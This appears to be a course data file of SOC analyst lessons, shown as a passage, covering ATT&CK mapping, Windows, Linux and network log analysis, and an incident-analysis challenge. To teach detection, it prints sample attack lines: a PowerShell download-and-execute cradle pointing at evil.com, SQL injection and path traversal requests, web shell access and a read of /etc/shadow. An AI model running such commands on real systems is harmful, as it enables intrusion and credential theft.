### Technique Example: T1566 - Phishing

\`\`\`
T1566 - Phishing (Technique)
    │
    ├── T1566.001 - Spearphishing Attachment
    │
    ├── T1566.002 - Spearphishing Link
    │
    └── T1566.003 - Spearphishing via Service
\`\`\`

### Technique Deep Dive: T1059 - Command and Scripting Interpreter

| Sub-Technique | ID | Detection Focus |
|---------------|-----|-----------------|
| PowerShell | T1059.001 | Script block logging |
| Windows Command Shell | T1059.003 | cmd.exe child processes |
| Python | T1059.006 | python.exe execution |
| JavaScript | T1059.007 | wscript.exe, cscript.exe |

## Using ATT&CK in the SOC

### 1. Alert Mapping

Map your detection rules to ATT&CK:

\`\`\`
Alert: "Suspicious PowerShell Execution"
├── Tactic: Execution
├── Technique: T1059.001 (PowerShell)
└── Detection: Script block with encoded commands
\`\`\`

### 2. Investigation Context

When investigating an alert:

\`\`\`
1. Identify the technique observed
2. Check what tactics it falls under
3. Look for related techniques (same tactic)
4. Anticipate next likely techniques
5. Search for those behaviors
\`\`\`

### 3. Attack Chain Analysis

\`\`\`
Initial Access → Execution → Persistence → Discovery → Lateral Movement
     ↓              ↓            ↓            ↓              ↓
  T1566.001     T1059.001    T1547.001    T1083        T1021.002
  Phishing      PowerShell   Registry     File         SMB/Admin
  Attachment                 Run Keys     Discovery     Shares
\`\`\`

## ATT&CK Navigator

The ATT&CK Navigator is a web-based tool for visualizing coverage:

**Use Cases:**
- Highlight techniques your tools detect
- Map an incident across the matrix
- Compare coverage across security tools
- Visualize threat actor TTPs

### Creating a Layer

1. Go to ATT&CK Navigator
2. Create new layer
3. Select techniques to highlight
4. Add colors for different meanings
5. Export for reporting

## Data Sources

ATT&CK maps techniques to data sources needed for detection:

| Data Source | Example |
|-------------|---------|
| Process | Process creation, command line |
| File | File creation, modification |
| Network Traffic | Connection, DNS queries |
| Windows Registry | Registry modification |
| Authentication | Logon events |

## Practice: Mapping an Attack

**Scenario: Emotet Infection Chain**

\`\`\`
1. User receives phishing email (T1566.001)
2. Opens Word doc with macro (T1204.002)
3. Macro executes PowerShell (T1059.001)
4. Downloads Emotet payload (T1105)
5. Creates scheduled task (T1053.005)
6. Beacons to C2 (T1071.001)
7. Drops Cobalt Strike (T1105)
8. Credential dumping (T1003.001)
\`\`\`
    `,
    keyTakeaways: [
      "ATT&CK provides a common language for describing adversary behavior",
      "Tactics are the 'why' (goals), techniques are the 'how' (methods)",
      "14 tactics cover the full attack lifecycle from reconnaissance to impact",
      "Map your detections to ATT&CK to identify coverage gaps",
      "Use ATT&CK Navigator to visualize and analyze attack chains"
    ],
    additionalResources: [
      { title: "MITRE ATT&CK Website", type: "documentation", url: "https://attack.mitre.org/" },
      { title: "ATT&CK Navigator", type: "tool", url: "https://mitre-attack.github.io/attack-navigator/" }
    ]
  },
  // Module 3: Log Analysis Fundamentals
  {
    id: "3.1",
    courseId: "soc-fundamentals",
    title: "Why Logs Matter in Security",
    content: `
# Why Logs Matter in Security

Logs are the foundation of security operations. Without logs, we're blind to what's happening in our environment. This lesson explains why logs are critical and how they enable detection and investigation.

## The Importance of Logging

> "If a tree falls in a forest and no one is around to hear it, does it make a sound? In cybersecurity, if an attack happens and there's no log, it didn't happen."

### Logs Enable:

1. **Detection** - Identifying malicious activity
2. **Investigation** - Understanding what happened
3. **Forensics** - Reconstructing incidents
4. **Compliance** - Meeting regulatory requirements
5. **Troubleshooting** - Diagnosing issues

## What Gets Logged?

\`\`\`
┌─────────────────────────────────────────────────────────────┐
│                    LOG SOURCES                               │
├──────────────┬──────────────┬──────────────┬───────────────┤
│  Endpoints   │   Network    │   Identity   │  Applications │
├──────────────┼──────────────┼──────────────┼───────────────┤
│ • OS Events  │ • Firewall   │ • Active Dir │ • Web Servers │
│ • Process    │ • IDS/IPS    │ • SSO/SAML   │ • Databases   │
│ • File Ops   │ • Proxy      │ • MFA        │ • Email       │
│ • Registry   │ • DNS        │ • VPN        │ • Cloud SaaS  │
│ • Services   │ • NetFlow    │ • PAM        │ • Custom Apps │
└──────────────┴──────────────┴──────────────┴───────────────┘
\`\`\`

## Log Anatomy

A typical log entry contains:

| Field | Description | Example |
|-------|-------------|---------|
| **Timestamp** | When it happened | 2024-01-15T14:32:05Z |
| **Source** | Where it came from | WKS-USER01 |
| **Event Type** | What type of event | Authentication |
| **Severity** | How important | Warning |
| **Details** | Specific information | User logon failed |
| **User** | Who was involved | jsmith |
| **Target** | What was affected | FileServer01 |

### Log Format Examples

**Windows Event Log (XML):**
\`\`\`xml
<Event>
  <System>
    <EventID>4625</EventID>
    <TimeCreated SystemTime="2024-01-15T14:32:05Z"/>
    <Computer>WKS-USER01</Computer>
  </System>
  <EventData>
    <Data Name="TargetUserName">jsmith</Data>
    <Data Name="LogonType">3</Data>
    <Data Name="FailureReason">%%2313</Data>
  </EventData>
</Event>
\`\`\`

**Syslog (Linux):**
\`\`\`
Jan 15 14:32:05 webserver01 sshd[12345]: Failed password for invalid user admin from 192.168.1.100 port 52431 ssh2
\`\`\`

**JSON (Modern Applications):**
\`\`\`json
{
  "timestamp": "2024-01-15T14:32:05Z",
  "level": "warning",
  "service": "auth-service",
  "message": "Login failed",
  "user": "jsmith",
  "source_ip": "192.168.1.100",
  "failure_reason": "invalid_password"
}
\`\`\`

## Log Collection Architecture

\`\`\`
┌──────────────────────────────────────────────────────────────┐
│                         SIEM                                  │
└──────────────────────────┬───────────────────────────────────┘
                           │
            ┌──────────────┼──────────────┐
            │              │              │
     ┌──────┴──────┐ ┌─────┴─────┐ ┌──────┴──────┐
     │ Log Shipper │ │  Syslog   │ │   API/      │
     │  (Agent)    │ │  Server   │ │   Webhook   │
     └──────┬──────┘ └─────┬─────┘ └──────┬──────┘
            │              │              │
     ┌──────┴──────┐ ┌─────┴─────┐ ┌──────┴──────┐
     │  Endpoints  │ │  Network  │ │   Cloud     │
     │             │ │  Devices  │ │   Services  │
     └─────────────┘ └───────────┘ └─────────────┘
\`\`\`

## Common Logging Challenges

### 1. Volume
- Large environments generate billions of events
- Storage and processing costs
- Finding needles in haystacks

### 2. Normalization
- Different formats from different sources
- Field name variations
- Time zone issues

### 3. Coverage Gaps
- Systems not sending logs
- Critical events not logged
- Log forwarding failures

### 4. Retention
- Compliance requirements vary
- Storage limitations
- Incident investigation needs

## Log Quality Indicators

### Good Logging:
✅ Consistent timestamps (UTC preferred)
✅ Unique identifiers
✅ Contextual information
✅ Standardized format
✅ Appropriate verbosity

### Poor Logging:
❌ Missing timestamps
❌ Vague messages
❌ No user/source info
❌ Inconsistent format
❌ Excessive noise

## Security-Critical Logs

### Must-Have Log Sources:

| Priority | Log Source | What It Tells You |
|----------|------------|-------------------|
| Critical | Authentication | Who logged in, failed attempts |
| Critical | Endpoint (EDR) | Process execution, file activity |
| Critical | Firewall | Network connections, blocked traffic |
| High | DNS | Domain lookups, potential C2 |
| High | Proxy | Web traffic, downloads |
| High | Email Gateway | Phishing attempts, malware |
| Medium | DHCP | IP assignments |
| Medium | VPN | Remote access |
    `,
    keyTakeaways: [
      "Logs are the foundation of security detection and investigation",
      "Key log sources include endpoints, network devices, identity systems, and applications",
      "Every log entry should have timestamp, source, event type, and relevant details",
      "Common challenges include volume, normalization, coverage gaps, and retention",
      "Prioritize authentication, endpoint, firewall, DNS, and proxy logs"
    ]
  },
  {
    id: "3.2",
    courseId: "soc-fundamentals",
    title: "Windows Event Log Essentials",
    content: `
# Windows Event Log Essentials

Windows Event Logs are one of the most valuable data sources for SOC analysts. Understanding key Event IDs and their significance is essential for threat detection.

## Windows Event Log Architecture

\`\`\`
┌─────────────────────────────────────────────────────────┐
│                  WINDOWS EVENT LOGS                      │
├─────────────┬─────────────┬─────────────┬──────────────┤
│   System    │   Security  │ Application │  Custom Logs  │
├─────────────┼─────────────┼─────────────┼──────────────┤
│ OS Events   │ Logons      │ App Errors  │ PowerShell    │
│ Drivers     │ Privilege   │ Installations│ Sysmon       │
│ Services    │ Object      │ Crashes     │ Application   │
│ Hardware    │ Access      │             │ Specific      │
└─────────────┴─────────────┴─────────────┴──────────────┘
\`\`\`

## Critical Security Event IDs

### Authentication Events

| Event ID | Description | Security Significance |
|----------|-------------|----------------------|
| **4624** | Successful logon | Track who logged in |
| **4625** | Failed logon | Brute force detection |
| **4648** | Explicit credentials | RunAs, lateral movement |
| **4672** | Special privileges assigned | Admin activity |
| **4776** | NTLM authentication | Credential validation |

### Logon Types (Event 4624/4625)

| Type | Name | Meaning |
|------|------|---------|
| 2 | Interactive | Console logon |
| 3 | Network | SMB, network share |
| 4 | Batch | Scheduled task |
| 5 | Service | Service start |
| 7 | Unlock | Workstation unlock |
| 10 | RemoteInteractive | RDP |
| 11 | CachedInteractive | Cached credentials |

### Account Management

| Event ID | Description | Why It Matters |
|----------|-------------|----------------|
| **4720** | User account created | New account (authorized?) |
| **4722** | User account enabled | Disabled account activated |
| **4724** | Password reset attempt | Privilege abuse potential |
| **4728** | User added to security group | Privilege escalation |
| **4732** | User added to local group | Local admin changes |
| **4740** | Account locked out | Brute force indicator |

### Process Execution

| Event ID | Description | Detection Use |
|----------|-------------|---------------|
| **4688** | Process creation | Command line auditing |
| **1** (Sysmon) | Process create | Enhanced process tracking |
| **4689** | Process termination | Process lifecycle |

**Example 4688 Analysis:**
\`\`\`
Event ID: 4688
Process Name: C:\\Windows\\System32\\cmd.exe
Command Line: cmd.exe /c whoami
Creator Process: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
User: DOMAIN\\jsmith

Analysis: PowerShell spawned cmd.exe running reconnaissance
\`\`\`

### Object Access & File Activity

| Event ID | Description | Use Case |
|----------|-------------|----------|
| **4663** | Object access attempt | File access monitoring |
| **4656** | Handle requested | Object access intent |
| **4660** | Object deleted | Data destruction |
| **5140** | Network share accessed | Lateral movement |
| **5145** | Share object accessed | File share activity |

### Scheduled Tasks

| Event ID | Description | Detection |
|----------|-------------|-----------|
| **4698** | Scheduled task created | Persistence mechanism |
| **4702** | Scheduled task updated | Task modification |
| **4699** | Scheduled task deleted | Cleanup activity |

### PowerShell Logging

| Event ID | Log | Description |
|----------|-----|-------------|
| **4103** | PowerShell Operational | Module logging |
| **4104** | PowerShell Operational | Script block logging |
| **400/403** | PowerShell | Engine lifecycle |

**Script Block Example:**
\`\`\`powershell
# Suspicious script block content
IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')
\`\`\`

## Sysmon - Enhanced Windows Logging

Sysmon provides detailed logging beyond native Windows events:

| Event ID | Description |
|----------|-------------|
| 1 | Process creation (with hashes) |
| 3 | Network connection |
| 7 | Image loaded (DLL) |
| 8 | CreateRemoteThread |
| 10 | Process access |
| 11 | File creation |
| 12-14 | Registry events |
| 22 | DNS query |

## Hunting Patterns

### Brute Force Detection
\`\`\`
Event ID: 4625 (Failed logons)
Pattern: Same target, multiple failures
Time: Within short window (minutes)
Threshold: >5 failures in 5 minutes
\`\`\`

### Lateral Movement
\`\`\`
Event ID: 4624 (Successful logon)
Logon Type: 3 (Network) or 10 (RDP)
Pattern: Same account, multiple systems
Correlation: Following 4625 failures
\`\`\`

### Privilege Escalation
\`\`\`
Event IDs: 4728, 4732 (Group membership)
Groups: Administrators, Domain Admins
Pattern: Unexpected additions
Context: Who made the change?
\`\`\`

### Suspicious Process Chains
\`\`\`
Parent: outlook.exe
Child: powershell.exe
Grandchild: cmd.exe → whoami

Analysis: Email client spawning scripting interpreters
Verdict: Likely malicious macro execution
\`\`\`
    `,
    keyTakeaways: [
      "Event IDs 4624/4625 track successful and failed logons with logon types",
      "Event ID 4688 captures process creation with command line details",
      "Account management events (4720, 4728, 4732) reveal privilege changes",
      "PowerShell script block logging (4104) captures executed scripts",
      "Sysmon enhances native logging with process hashes, network connections, and DNS"
    ],
    practicalExercise: {
      title: "Windows Event Log Analysis",
      description: "Analyze a set of Windows Security logs to identify suspicious activity.",
      steps: [
        "Review provided event logs for authentication anomalies",
        "Identify any brute force attempts using Event ID 4625",
        "Track lateral movement using logon type 3 and 10 events",
        "Find privilege escalation through group membership changes",
        "Document findings with timeline and affected systems"
      ]
    }
  },
  {
    id: "3.3",
    courseId: "soc-fundamentals",
    title: "Linux Log Analysis Basics",
    content: `
# Linux Log Analysis Basics

Linux systems generate valuable security logs in various locations. Understanding these logs is essential for detecting threats in Unix/Linux environments.

## Linux Log Locations

\`\`\`
/var/log/
├── auth.log          # Authentication (Debian/Ubuntu)
├── secure            # Authentication (RHEL/CentOS)
├── syslog            # System messages
├── messages          # General system logs
├── kern.log          # Kernel messages
├── dmesg             # Boot/hardware messages
├── cron.log          # Scheduled tasks
├── maillog           # Email server logs
├── httpd/            # Apache logs
│   ├── access_log
│   └── error_log
├── nginx/            # Nginx logs
└── audit/            # Audit framework logs
    └── audit.log
\`\`\`

## Authentication Logs (auth.log/secure)

### Successful SSH Login
\`\`\`
Jan 15 10:23:45 server01 sshd[12345]: Accepted publickey for admin from 192.168.1.50 port 54321 ssh2: RSA SHA256:abc123...
Jan 15 10:23:45 server01 sshd[12345]: pam_unix(sshd:session): session opened for user admin by (uid=0)
\`\`\`

### Failed SSH Login
\`\`\`
Jan 15 10:24:01 server01 sshd[12346]: Failed password for invalid user hacker from 10.0.0.100 port 45678 ssh2
Jan 15 10:24:01 server01 sshd[12346]: Connection closed by invalid user hacker 10.0.0.100 port 45678 [preauth]
\`\`\`

### Brute Force Pattern
\`\`\`
Jan 15 10:25:01 server01 sshd[12347]: Failed password for root from 203.0.113.50 port 12345 ssh2
Jan 15 10:25:02 server01 sshd[12348]: Failed password for root from 203.0.113.50 port 12346 ssh2
Jan 15 10:25:03 server01 sshd[12349]: Failed password for root from 203.0.113.50 port 12347 ssh2
Jan 15 10:25:04 server01 sshd[12350]: Failed password for admin from 203.0.113.50 port 12348 ssh2
\`\`\`

### Sudo Usage
\`\`\`
Jan 15 11:00:00 server01 sudo: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/cat /etc/shadow
\`\`\`

### User/Group Changes
\`\`\`
Jan 15 12:00:00 server01 useradd[5678]: new user: name=backdoor, UID=1001, GID=1001, home=/home/backdoor
Jan 15 12:00:01 server01 usermod[5679]: add 'backdoor' to group 'sudo'
\`\`\`

## Security-Critical Events

| Event Type | Log File | What to Look For |
|------------|----------|------------------|
| SSH authentication | auth.log/secure | Failed/successful logins |
| Sudo usage | auth.log/secure | Privilege escalation |
| User management | auth.log/secure | useradd, usermod, userdel |
| Cron execution | cron.log, syslog | Scheduled task runs |
| Service changes | syslog, messages | Service start/stop/failure |
| Kernel events | kern.log | Module loading, security |

## Syslog Format

Standard syslog format:
\`\`\`
TIMESTAMP HOSTNAME PROGRAM[PID]: MESSAGE

Jan 15 10:23:45 webserver01 nginx[1234]: 192.168.1.100 - - [15/Jan/2024:10:23:45 +0000] "GET /admin HTTP/1.1" 403 162
\`\`\`

### Syslog Severity Levels

| Level | Name | Description |
|-------|------|-------------|
| 0 | Emergency | System unusable |
| 1 | Alert | Immediate action needed |
| 2 | Critical | Critical conditions |
| 3 | Error | Error conditions |
| 4 | Warning | Warning conditions |
| 5 | Notice | Normal but significant |
| 6 | Info | Informational |
| 7 | Debug | Debug messages |

## Linux Audit Framework

### Auditd Events
\`\`\`
type=SYSCALL msg=audit(1705312800.123:456): arch=c000003e syscall=59 success=yes exit=0 
  a0=7ffd12345678 a1=7ffd12345690 a2=7ffd123456a0 a3=0 items=2 ppid=1234 pid=5678 
  auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 
  exe="/bin/bash" key="exec_monitor"
\`\`\`

### Common Audit Rules
\`\`\`bash
# Monitor file access
-w /etc/passwd -p wa -k identity
-w /etc/shadow -p wa -k identity

# Monitor command execution
-a always,exit -F arch=b64 -S execve -k exec_monitor

# Monitor privilege escalation
-w /usr/bin/sudo -p x -k privilege_escalation
-w /usr/bin/su -p x -k privilege_escalation
\`\`\`

## Web Server Logs

### Apache Access Log
\`\`\`
192.168.1.100 - - [15/Jan/2024:10:30:00 +0000] "GET /admin/login.php HTTP/1.1" 200 1234 "-" "Mozilla/5.0..."
\`\`\`

### Suspicious Web Activity

**SQL Injection Attempt:**
\`\`\`
192.168.1.100 - - [15/Jan/2024:10:31:00 +0000] "GET /search.php?q=1'+OR+'1'='1 HTTP/1.1" 200 5678
\`\`\`

**Path Traversal:**
\`\`\`
192.168.1.100 - - [15/Jan/2024:10:32:00 +0000] "GET /download.php?file=../../../etc/passwd HTTP/1.1" 200 2345
\`\`\`

**Web Shell Access:**
\`\`\`
192.168.1.100 - - [15/Jan/2024:10:33:00 +0000] "POST /uploads/shell.php?cmd=whoami HTTP/1.1" 200 15
\`\`\`

## Log Analysis Commands

### Essential Commands
\`\`\`bash
# View recent auth failures
grep "Failed password" /var/log/auth.log | tail -20

# Count failures by IP
grep "Failed password" /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn

# Find sudo usage
grep "sudo:" /var/log/auth.log

# Monitor in real-time
tail -f /var/log/auth.log | grep --color "Failed\\|Accepted"

# Search compressed logs
zgrep "pattern" /var/log/auth.log.*.gz
\`\`\`
    `,
    keyTakeaways: [
      "Linux logs are stored in /var/log with auth.log/secure for authentication",
      "SSH logs show accepted/failed connections with source IPs and usernames",
      "Sudo logs capture privilege escalation with full command details",
      "The audit framework provides detailed syscall and file access logging",
      "Web server logs can reveal SQL injection, path traversal, and web shell activity"
    ]
  },
  {
    id: "3.4",
    courseId: "soc-fundamentals",
    title: "Network Device Logs",
    content: `
# Network Device Logs

Network device logs provide visibility into traffic patterns, connection attempts, and potential threats traversing your network. Understanding these logs is essential for detecting lateral movement, C2 communication, and data exfiltration.

## Network Log Sources

\`\`\`
┌─────────────────────────────────────────────────────────────┐
│                  NETWORK LOG SOURCES                         │
├───────────────┬───────────────┬───────────────┬─────────────┤
│   Firewall    │     Proxy     │      DNS      │    VPN      │
├───────────────┼───────────────┼───────────────┼─────────────┤
│ Allow/Deny    │ URL requests  │ Lookups       │ Connections │
│ Source/Dest   │ Categories    │ Responses     │ Users       │
│ Ports         │ User-Agent    │ Query types   │ Duration    │
│ Bytes         │ Downloads     │ NXDOMAIN      │ Bandwidth   │
└───────────────┴───────────────┴───────────────┴─────────────┘
\`\`\`

## Firewall Logs

### Log Fields
| Field | Description |
|-------|-------------|
| Timestamp | When the event occurred |
| Source IP | Origin of connection |
| Source Port | Origin port |
| Destination IP | Target of connection |
| Destination Port | Target port (service) |
| Protocol | TCP/UDP/ICMP |
| Action | Allow/Deny/Drop |
| Bytes | Data transferred |
| Rule | Which rule matched |

### Example Firewall Log
\`\`\`
2024-01-15 10:30:00 ALLOW TCP 192.168.1.100:54321 -> 8.8.8.8:443 bytes=1234 rule=outbound-https
2024-01-15 10:30:01 DENY TCP 10.0.0.50:12345 -> 192.168.1.100:22 bytes=0 rule=block-external-ssh
2024-01-15 10:30:02 DENY TCP 203.0.113.100:45678 -> 192.168.1.1:3389 bytes=0 rule=block-rdp-external
\`\`\`

### Suspicious Patterns

**Port Scanning:**
\`\`\`
10:30:01 DENY 10.0.0.50 -> 192.168.1.100:21
10:30:01 DENY 10.0.0.50 -> 192.168.1.100:22
10:30:01 DENY 10.0.0.50 -> 192.168.1.100:23
10:30:01 DENY 10.0.0.50 -> 192.168.1.100:25
... (sequential ports in milliseconds)
\`\`\`

**Beaconing (C2):**
\`\`\`
10:00:00 ALLOW 192.168.1.100 -> 45.33.32.156:443 bytes=256
10:05:00 ALLOW 192.168.1.100 -> 45.33.32.156:443 bytes=256
10:10:00 ALLOW 192.168.1.100 -> 45.33.32.156:443 bytes=256
... (regular intervals, consistent size)
\`\`\`

**Data Exfiltration:**
\`\`\`
10:30:00 ALLOW 192.168.1.100 -> 185.234.72.50:443 bytes=50000000
(Large outbound transfer to unknown destination)
\`\`\`

## Proxy Logs

### Key Fields
| Field | Description |
|-------|-------------|
| User | Authenticated user |
| Source IP | Client IP |
| URL | Full URL requested |
| Domain | Domain only |
| Category | URL category |
| Action | Allow/Block |
| Status Code | HTTP response code |
| Bytes | Downloaded size |
| User-Agent | Browser/client info |

### Example Proxy Log
\`\`\`
2024-01-15 10:30:00 user=jsmith src=192.168.1.100 url="https://github.com/project" 
  category=Technology action=ALLOW status=200 bytes=45678 
  ua="Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
\`\`\`

### Suspicious Indicators

**Malware Download:**
\`\`\`
url="http://suspicious-domain.com/update.exe"
category=Uncategorized
ua="PowerShell/5.1"
\`\`\`

**Encoded Data:**
\`\`\`
url="https://pastebin.com/raw/aB3dE5fG"
(Data exfil via paste sites)
\`\`\`

## DNS Logs

### Query Types
| Type | Description | Security Relevance |
|------|-------------|-------------------|
| A | IPv4 address | Normal lookups |
| AAAA | IPv6 address | Normal lookups |
| MX | Mail server | Email config |
| TXT | Text records | Can hide data |
| CNAME | Alias | Redirections |
| PTR | Reverse lookup | Reconnaissance |

### Example DNS Log
\`\`\`
2024-01-15 10:30:00 client=192.168.1.100 query=github.com type=A response=140.82.121.4
2024-01-15 10:30:01 client=192.168.1.100 query=malware-c2.xyz type=A response=NXDOMAIN
\`\`\`

### DNS Threat Indicators

**Domain Generation Algorithm (DGA):**
\`\`\`
query=asdkjf23.com NXDOMAIN
query=bx8ks92m.com NXDOMAIN
query=c9xnp3lq.com NXDOMAIN
(Random-looking domains, many NXDOMAIN)
\`\`\`

**DNS Tunneling:**
\`\`\`
query=aGVsbG8gd29ybGQ.data.evil.com type=TXT
query=ZXhmaWx0cmF0ZWQgZGF0YQ.data.evil.com type=TXT
(Base64 in subdomain = data exfiltration)
\`\`\`

**Newly Registered Domain:**
\`\`\`
query=totally-legit-bank-login.com
(First seen today, mimics legitimate site)
\`\`\`

## VPN Logs

### Key Fields
| Field | Description |
|-------|-------------|
| Username | Authenticated user |
| Source IP | Client public IP |
| Assigned IP | VPN tunnel IP |
| Connect Time | Session start |
| Duration | Connection length |
| Bytes In/Out | Data transferred |

### Suspicious VPN Patterns

**Impossible Travel:**
\`\`\`
10:00:00 user=jsmith src_ip=New_York connected
10:30:00 user=jsmith src_ip=Moscow connected
(Same user, different continents, 30 min apart)
\`\`\`

**Off-Hours Access:**
\`\`\`
03:00:00 user=cfo src_ip=Unknown_Country connected
(Executive account, unusual time/location)
\`\`\`
    `,
    keyTakeaways: [
      "Firewall logs show allow/deny decisions with source, destination, and ports",
      "Proxy logs provide URL-level visibility with user attribution and categories",
      "DNS logs can reveal DGA domains, tunneling, and malicious lookups",
      "VPN logs track remote access with user, location, and duration details",
      "Look for patterns: scanning, beaconing, impossible travel, and data exfiltration"
    ]
  },
  {
    id: "3.5",
    courseId: "soc-fundamentals",
    title: "Hands-On: Log Analysis Challenge",
    content: `
# Hands-On: Log Analysis Challenge

Put your log analysis skills to the test with this practical challenge. You'll analyze logs from multiple sources to investigate a potential security incident.

## Challenge Scenario

**Background:**
Your SOC received an alert about potential suspicious activity on a workstation (WKS-FIN01) in the Finance department. The user reported their computer was "acting slow" this morning. Your task is to analyze the logs and determine what happened.

## Provided Evidence

### Evidence 1: Windows Security Events

\`\`\`
# Event 1 - Yesterday 18:45:00
EventID: 4625
TargetUserName: admin
WorkstationName: WKS-FIN01
FailureReason: Unknown user name or bad password
SourceNetworkAddress: 192.168.1.50
LogonType: 3

# Event 2 - Yesterday 18:45:01 through 18:52:00 (47 similar events)
EventID: 4625 (repeated 47 times)
TargetUserName: admin, administrator, root, finance, backup
SourceNetworkAddress: 192.168.1.50

# Event 3 - Yesterday 18:53:00
EventID: 4624
TargetUserName: svc_backup
WorkstationName: WKS-FIN01
SourceNetworkAddress: 192.168.1.50
LogonType: 3

# Event 4 - Yesterday 18:55:00
EventID: 4688
NewProcessName: C:\\Windows\\System32\\cmd.exe
CommandLine: cmd.exe /c whoami
ParentProcessName: C:\\Windows\\System32\\services.exe

# Event 5 - Yesterday 18:56:00
EventID: 4688
NewProcessName: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
CommandLine: powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA...
ParentProcessName: C:\\Windows\\System32\\cmd.exe
\`\`\`

### Evidence 2: Firewall Logs

\`\`\`
2024-01-14 18:54:00 ALLOW TCP 192.168.10.100:49152 -> 192.168.1.50:445 (WKS-FIN01 to unknown)
2024-01-14 19:00:00 ALLOW TCP 192.168.10.100:49153 -> 45.33.32.156:443 bytes=2048
2024-01-14 19:05:00 ALLOW TCP 192.168.10.100:49153 -> 45.33.32.156:443 bytes=1024
2024-01-14 19:10:00 ALLOW TCP 192.168.10.100:49153 -> 45.33.32.156:443 bytes=1024
2024-01-14 19:15:00 ALLOW TCP 192.168.10.100:49153 -> 45.33.32.156:443 bytes=1024
2024-01-14 23:00:00 ALLOW TCP 192.168.10.100:49160 -> 45.33.32.156:443 bytes=50000000
\`\`\`

### Evidence 3: DNS Logs

\`\`\`
2024-01-14 18:59:00 192.168.10.100 query=update-service.net type=A response=45.33.32.156
2024-01-14 19:00:00 192.168.10.100 query=update-service.net type=A response=45.33.32.156
2024-01-15 08:30:00 192.168.10.100 query=update-service.net type=A response=45.33.32.156
\`\`\`

## Analysis Questions

### Question 1: Initial Access
- What type of attack was attempted first?
- Was it successful? What evidence supports this?
- What account was compromised?

### Question 2: Execution
- What commands were executed?
- What is the encoded PowerShell command likely doing?
- What is the parent-child process relationship?

### Question 3: Command & Control
- What IP address is the C2 server?
- What domain resolves to this IP?
- What pattern suggests C2 beaconing?

### Question 4: Data Exfiltration
- Is there evidence of data theft?
- How much data may have been exfiltrated?
- When did this occur?

## Analysis Walkthrough

### Step 1: Timeline Construction

\`\`\`
18:45:00 - Brute force attack begins from 192.168.1.50
18:52:00 - 47+ failed login attempts
18:53:00 - Successful login with svc_backup account (Type 3 = Network)
18:55:00 - cmd.exe executes whoami (reconnaissance)
18:56:00 - PowerShell with encoded command (malware download?)
18:59:00 - DNS lookup for update-service.net
19:00:00 - First C2 beacon to 45.33.32.156:443
19:05-19:15 - Regular beaconing pattern (every 5 min)
23:00:00 - Large outbound transfer (50MB) - exfiltration
\`\`\`

### Step 2: Attack Chain (MITRE ATT&CK)

| Phase | Technique | Evidence |
|-------|-----------|----------|
| Initial Access | T1110 Brute Force | 47 failed logins |
| Credential Access | T1110.001 Password Guessing | Multiple usernames tried |
| Execution | T1059.001 PowerShell | Encoded PowerShell command |
| Discovery | T1033 System Owner | whoami command |
| C2 | T1071.001 Web Protocols | HTTPS to 45.33.32.156 |
| Exfiltration | T1041 Exfil Over C2 | 50MB transfer at 23:00 |

### Step 3: IOC Extraction

\`\`\`
IP Addresses:
- 192.168.1.50 (Attacker source - internal?)
- 45.33.32.156 (C2 server)

Domains:
- update-service.net

Accounts:
- svc_backup (compromised)

Files/Commands:
- Encoded PowerShell command
- C:\\Windows\\System32\\cmd.exe
\`\`\`

## Your Report

**Incident Summary:**
[Write a brief summary of what happened]

**Timeline of Events:**
[List key events in chronological order]

**Affected Systems:**
[List compromised systems and accounts]

**Indicators of Compromise:**
[List all IOCs discovered]

**Recommended Actions:**
[What should be done to contain and remediate?]
    `,
    keyTakeaways: [
      "Always build a timeline when analyzing logs from multiple sources",
      "Correlate events across different log sources (Windows, firewall, DNS)",
      "Map observed behaviors to MITRE ATT&CK techniques",
      "Extract IOCs (IPs, domains, hashes, accounts) for blocking and hunting",
      "Document findings in a structured incident report format"
    ],
    practicalExercise: {
      title: "Complete the Log Analysis Challenge",
      description: "Use the provided evidence to fully analyze the incident and create a report.",
      steps: [
        "Build a complete timeline of events",
        "Identify the attack chain using MITRE ATT&CK",
        "Extract all indicators of compromise",
        "Determine the scope of the incident",
        "Write recommended containment and remediation actions"
      ]
    }
  },
  // Module 4: SIEM Fundamentals
  {
    id: "4.1",
    courseId: "soc-fundamentals",
    title: "What is a SIEM?",
    content: `
# What is a SIEM?

A Security Information and Event Management (SIEM) system is the cornerstone of modern security operations. It aggregates, correlates, and analyzes log data from across your environment to detect threats.

## SIEM Definition

**SIEM** = **S**ecurity **I**nformation and **E**vent **M**anagement

A SIEM combines two capabilities:
- **SIM (Security Information Management)**: Log collection, storage, and compliance reporting
- **SEM (Security Event Management)**: Real-time monitoring, correlation, and alerting

## Core SIEM Functions

\`\`\`
┌─────────────────────────────────────────────────────────────────┐
│                        SIEM PLATFORM                             │
├─────────────┬───────────────┬───────────────┬──────────────────┤
│  Collection │   Parsing &   │  Correlation  │   Alerting &     │
│  & Ingestion│ Normalization │   & Rules     │   Dashboards     │
├─────────────┼───────────────┼───────────────┼──────────────────┤
│ • Agents    │ • Field       │ • Rules       │ • Alerts         │
│ • Syslog    │   extraction  │ • Use cases   │ • Dashboards     │
│ • APIs      │ • Enrichment  │ • Baselines   │ • Reports        │
│ • Beats     │ • Tagging     │ • Anomalies   │ • Investigations │
└─────────────┴───────────────┴───────────────┴──────────────────┘
\`\`\`

## How a SIEM Works

### 1. Data Collection

\`\`\`
Sources:
┌──────────────┐  ┌──────────────┐  ┌──────────────┐
│   Endpoints  │  │   Network    │  │    Cloud     │
│   (Agents)   │  │   (Syslog)   │  │    (APIs)    │
└──────┬───────┘  └──────┬───────┘  └──────┬───────┘
       │                 │                 │
       └─────────────────┼─────────────────┘
                         ↓
                   ┌───────────┐
                   │   SIEM    │
                   └───────────┘
\`\`\`

### 2. Parsing & Normalization

Raw logs are transformed into structured, searchable data:

**Before (Raw):**
\`\`\`
Jan 15 10:30:00 server01 sshd[12345]: Failed password for admin from 192.168.1.100 port 54321 ssh2
\`\`\`

**After (Normalized):**
\`\`\`json
{
  "timestamp": "2024-01-15T10:30:00Z",
  "source": "server01",
  "event_type": "authentication",
  "outcome": "failure",
  "user": "admin",
  "source_ip": "192.168.1.100",
